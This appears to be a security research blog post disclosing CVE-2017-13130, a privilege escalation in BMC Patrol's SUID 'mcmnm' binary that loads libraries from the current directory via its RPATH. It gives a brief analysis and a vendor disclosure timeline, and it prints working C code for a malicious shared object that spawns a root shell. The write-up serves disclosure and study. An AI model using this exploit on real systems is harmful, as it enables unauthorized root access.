---
title: "CVE-2017-13130 - BMC Patrol 'mcmnm' - Privilege Escalation via a Vulnerable SUID Binary"
layout: "post"
categories: [ "Privilege Escalation" ]
tags: [ "Research", "Vulnerability", "Privilege Escalation", "Exploit" ]
---

A vulnerability was discovered in the `mcmnm` binary. It is compiled with a `RPATH` starting with `.:`. Therefore, any user can craft a malicious library (e.g.: `libmcmclnx.so`) and then run `mcmnm` from the same directory to execute code as _root_.


![](/assets/posts/2018-06-06-bmc-patrol-mcmnm-privesc/00_exploit-demo.gif)

## Vulnerability analysis 

### File permissions

The `mcmnm` file is a `SUID` binary owned by _root_ and executable by everyone.

![](/assets/posts/2018-06-06-bmc-patrol-mcmnm-privesc/01_file-permissions_obf.png)

### Vulnerable RPATH

The binary's `RPATH` contains the unsecure path `.`. As a reminder, `RPATH` is the _run-time search path_. It can be used to specify the location of Shared Objects that will be loaded before any other library because the linker gives them a higher priority. Therefore, if a local user can create a custom Shared Object in one of these folders, then he/she will be able to hijack the execution flow of the program. In the present case, `.` can be regarded as a sort of wildcard, hence the obvious vulnerability.

![](/assets/posts/2018-06-06-bmc-patrol-mcmnm-privesc/02_readelf-rpath_obf.png)

### A quick dynamic analysis using `strace`

Thanks to `strace` we can see which SO files the binary tries to load and from where. For example, it tries to load `libmcmclnx.so'` from the current folder (because of the `.` in the `RPATH`). 

![](/assets/posts/2018-06-06-bmc-patrol-mcmnm-privesc/03_strace_obf.png)

## Exploit development 

### Shared Object hijacking
The exploit is quite simple as a local attacker only has to craft a malicious Shared Object file and execute the vulnerable binary from the same folder. The following code will spawn a _root_ shell as soon as the Object is loaded (similar to `DllMain` with Windows DLL).

```c
#include <stdio.h>
#include <stdlib.h>

static void so_hijacking() __attribute__((constructor));

void so_hijacking() {
    setreuid(0, 0);
    system("/bin/sh");
    exit(0);
}

void GetSysInfo() {}
```


### The exploit code 

The exploit was wrapped in a single script file. The first line (`BIN=/path/to/mcmnm`) must be modified to match the current installation of the Patrol package. If all goes well, you should get a _root_ shell. ;)

![](/assets/posts/2018-06-06-bmc-patrol-mcmnm-privesc/05_exploit_obf.png)

## Disclosure timeline

2017-04-21 - Vulnerability discovered  
2017-05-09 - Vendor contacted  
2017-06-05 - Still no response, reminder sent to vendor  
2017-08-22 - Still no response, vulnerability disclosed  

